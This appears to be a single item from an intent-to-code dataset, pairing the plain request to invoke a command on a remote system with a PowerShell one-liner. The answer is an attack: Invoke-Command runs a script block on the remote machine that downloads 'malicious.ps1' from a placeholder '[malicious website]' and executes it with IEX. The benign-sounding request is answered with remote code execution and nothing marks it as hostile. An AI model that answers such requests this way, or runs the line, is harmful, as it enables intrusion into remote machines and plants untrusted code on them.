# Natural language intent:
# Invoke a command on a remote system using PowerShell

Invoke-Command -ComputerName [IP Address] -ScriptBlock {IEX (New-Object Net.WebClient).DownloadString('http://[malicious website]/malicious.ps1')}
